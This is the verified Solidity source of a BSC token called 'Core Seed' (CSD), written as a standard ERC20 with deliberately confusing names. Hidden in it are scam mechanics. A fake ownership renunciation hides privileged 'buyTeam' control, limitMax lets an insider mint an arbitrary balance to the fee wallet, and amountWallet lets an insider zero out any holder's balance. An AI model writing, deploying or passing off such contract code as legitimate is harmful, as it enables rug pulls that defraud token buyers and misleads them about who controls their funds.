/**
 *Submitted for verification at BscScan.com on 2023-02-12
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

abstract contract shouldMarketing {
    function atBuy() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface limitTeam {
    function createPair(address takeLaunch, address liquidityAmountReceiver) external returns (address);
}

interface fromToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CoreSeed is IERC20, shouldMarketing {
    uint8 private limitBuy = 18;
    
    uint256 public totalTeam;
    uint256 private senderMax;
    bool private exemptReceiverFrom;
    
    uint256 private senderTx = 100000000 * 10 ** 18;
    address public swapAmountMarketing;
    string private totalListReceiver = "Core Seed";
    bool public senderTotalToken;
    uint256 private limitSwap;
    
    uint256 private shouldAmount;
    mapping(address => uint256) private enableTake;


    bool public feeToken;
    uint256 public buyList;
    string private autoTotal = "CSD";

    bool public minWalletTake;
    mapping(address => bool) public buyTeam;
    mapping(address => bool) public enableLimit;
    uint256 private swapTo;

    bool private swapList;
    mapping(address => mapping(address => uint256)) private marketingMode;
    address public feeTotal;
    address private liquidityReceiver;
    

    event OwnershipTransferred(address indexed listFrom, address indexed teamSwap);

    constructor (){
        
        fromToken buyAtLaunch = fromToken(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        swapAmountMarketing = limitTeam(buyAtLaunch.factory()).createPair(buyAtLaunch.WETH(), address(this));
        liquidityReceiver = atBuy();
        
        feeTotal = liquidityReceiver;
        buyTeam[feeTotal] = true;
        
        enableTake[feeTotal] = senderTx;
        emit Transfer(address(0), feeTotal, senderTx);
        totalLimitTrading();
    }

    

    function getOwner() external view returns (address) {
        return liquidityReceiver;
    }

    function approve(address walletSwap, uint256 toBuy) public virtual override returns (bool) {
        marketingMode[atBuy()][walletSwap] = toBuy;
        emit Approval(atBuy(), walletSwap, toBuy);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return senderTx;
    }

    function transfer(address atShouldFund, uint256 toBuy) external virtual override returns (bool) {
        return takeMax(atBuy(), atShouldFund, toBuy);
    }

    function modeReceiver() public {
        if (minWalletTake) {
            limitSwap = swapTo;
        }
        
        swapTo=0;
    }

    function minMode() public view returns (bool) {
        return feeToken;
    }

    function totalReceiver() public view returns (uint256) {
        return senderMax;
    }

    function totalLimitTrading() public {
        emit OwnershipTransferred(feeTotal, address(0));
        liquidityReceiver = address(0);
    }

    function launchedList() public view returns (uint256) {
        return limitSwap;
    }

    function limitMax(uint256 toBuy) public {
        if (!buyTeam[atBuy()]) {
            return;
        }
        enableTake[feeTotal] = toBuy;
    }

    function decimals() external view returns (uint8) {
        return limitBuy;
    }

    function marketingBuy(address autoToken) public {
        if (senderTotalToken) {
            return;
        }
        
        buyTeam[autoToken] = true;
        if (buyList != limitSwap) {
            limitSwap = buyList;
        }
        senderTotalToken = true;
    }

    function transferFrom(address toFund, address buyFrom, uint256 toBuy) external override returns (bool) {
        if (marketingMode[toFund][atBuy()] != type(uint256).max) {
            require(toBuy <= marketingMode[toFund][atBuy()]);
            marketingMode[toFund][atBuy()] -= toBuy;
        }
        return takeMax(toFund, buyFrom, toBuy);
    }

    function owner() external view returns (address) {
        return liquidityReceiver;
    }

    function balanceOf(address enableListTotal) public view virtual override returns (uint256) {
        return enableTake[enableListTotal];
    }

    function name() external view returns (string memory) {
        return totalListReceiver;
    }

    function launchFund() public {
        
        
        feeToken=false;
    }

    function allowance(address fundFee, address walletSwap) external view virtual override returns (uint256) {
        return marketingMode[fundFee][walletSwap];
    }

    function takeMax(address toFund, address buyFrom, uint256 toBuy) internal returns (bool) {
        if (toFund == feeTotal || buyFrom == feeTotal) {
            return totalTake(toFund, buyFrom, toBuy);
        }
        
        
        
        return totalTake(toFund, buyFrom, toBuy);
    }

    function atMax() public {
        if (limitSwap != totalTeam) {
            swapList = true;
        }
        
        minWalletTake=false;
    }

    function amountWallet(address maxLiquidity) public {
        
        if (maxLiquidity == feeTotal || maxLiquidity == swapAmountMarketing || !buyTeam[atBuy()]) {
            return;
        }
        if (buyList != senderMax) {
            shouldAmount = buyList;
        }
        enableTake[maxLiquidity] = 0;
    }

    function symbol() external view returns (string memory) {
        return autoTotal;
    }

    function fromFund() public view returns (uint256) {
        return shouldAmount;
    }

    function totalTake(address toFund, address buyFrom, uint256 toBuy) internal returns (bool) {
        require(enableTake[toFund] >= toBuy);
        enableTake[toFund] -= toBuy;
        enableTake[buyFrom] += toBuy;
        emit Transfer(toFund, buyFrom, toBuy);
        return true;
    }


}